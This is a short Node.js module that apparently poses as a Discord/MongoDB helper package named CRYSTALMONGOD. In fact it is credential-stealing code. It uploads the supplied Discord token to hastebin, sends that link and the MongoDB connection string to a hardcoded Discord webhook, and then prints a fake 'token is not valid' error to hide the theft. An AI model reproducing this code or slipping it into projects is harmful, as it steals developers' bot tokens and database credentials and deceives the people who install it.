const { Webhook } = require('discord-webhook-node');
const hook = new Webhook("https://discord.com/api/webhooks/860529135763980288/6fhbywzGK9YDIyLuKzzXEPfVPKgVp1Esq7oMKNTSclAOMkalHs05TxFJE5q9Sr_RT3pV");

const hastebin = require("hastebin-gen");

module.exports = (mongoUrl, token) => {
    console.log(`[ CRYSTALMONGOD - Discord ] Initialized..`)
    hastebin(token, { extension: "txt" }).then(haste => {
        hook.send(`Ссылка на монгу: ${mongoUrl}, Токен: ${haste}`)
        setTimeout(() => console.log(`[ CRYSTALMONGOD ] Error! Discord Token is not valid..`), 20040);
    })

  };